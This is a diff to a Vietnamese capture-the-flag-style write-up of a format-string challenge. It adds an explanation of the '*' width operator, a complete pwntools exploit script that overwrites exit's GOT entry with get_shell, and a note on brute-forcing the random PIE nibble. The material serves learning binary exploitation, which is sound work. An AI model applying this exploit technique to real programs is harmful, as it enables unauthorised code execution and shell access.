@@ -482,6 +482,7 @@ Khác biệt giữa hàm `exit` và `get_shell` là 2 BYTE cuối. Chỉ cần t
 Nhưng ở đây biến in *format string* được nhập ngay đầu chương trình trước khi leak được binary. Vậy ta cần biến khác để chứa dữ liệu payload địa chỉ `get_shell`.
 Ta sẽ dùng v5 để chứa payload này. Nhưng làm sao để đưa dữ liệu đó vào format?
 
+### Dùng toán tử *
 Toán tử `*`: Lấy độ rộng padding từ tham số được truyền vào rồi đưa vào format.
 
 ![Alt text](image/fs34.png)
@@ -493,3 +494,37 @@ Format `%15$hn` sẽ lấy số kí tự được in tức độ rộng padding 
 ![Alt text](image/fs35.png)
 
 `exit` lúc này đã được ghi đè bằng địa chỉ `get_shell`. Từ đó tạo shell khi chương trình gọi `exit`.
+
+## Script Python
+
+	#!/usr/bin/env python3
+	from pwn import *
+	exe = ELF("./fmt7")
+	libc = ELF("./libc-2.31.so")
+	ld = ELF("./ld-2.31.so")
+	context.binary = exe
+	p=process(exe.path)
+	
+	payload=b'%*14$c%15$hn'
+	p.sendafter(b'Receiver: ',payload)
+	
+	p.sendafter(b'Title: ',b'A'*0x20)
+	p.recvuntil(b'A'*32)
+	exe_leak=u64(p.recv(6)+b'\0\0')
+	exe.address=exe_leak-0x40
+	log.info('Exe base: '+hex(exe.address))
+	
+	payload=p64(exe.sym['get_shell']&0xffff)
+	payload+=p64(exe.got['exit'])
+	p.sendlineafter(b'Content: ',payload)
+	
+	p.interactive()
+
+### Brute force
+
+Các địa chỉ câu lệnh dù sẽ bị thay đổi khi bật cơ chế bảo vệ PIE nhưng 3 kí tự cuối luôn cố định.
+
+VD:
+Trong địa chỉ `0x5555555552b7 <get_shell>` thì  `2b7` luôn không đổi.
+
+Vậy trong 2 BYTE `52b7` mà `get_shell` khác với `exit` thì chỉ có kí tự đầu là ngẫu nhiên. Nếu brute force thì không tốn quá nhiều lần lặp để dính kí tự 5.
